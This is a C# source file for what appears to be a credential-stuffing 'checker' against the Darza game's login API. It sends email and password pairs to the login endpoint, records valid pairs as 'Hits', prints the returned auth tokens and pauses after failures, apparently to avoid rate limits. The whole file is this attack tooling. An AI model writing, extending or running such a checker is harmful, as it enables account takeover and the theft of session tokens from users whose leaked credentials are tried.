using System;
using System.Collections.Generic;
using System.Text;
using DarzaAPI;
using System.Threading;

namespace DarzaChecker
{
    public class Checker
    {



		public static void SendRequest(string email, string password)
        {
			WebServerClient.Login(email, password, delegate (WbLoginResp response)
			{
				if (response == null)
				{
					Console.WriteLine("failure");
					Data.Checked++;
					Thread.Sleep(5000);
					return;
				}
				else if (response.Success)
				{
					Console.WriteLine("Correct credentials");
					Console.WriteLine("auth token: " + response.Value);
					Data.Hits.Add(email + ":" + password);
				}
				Console.WriteLine(response.Value);
				Data.Checked++;

			});
		}
    }
}
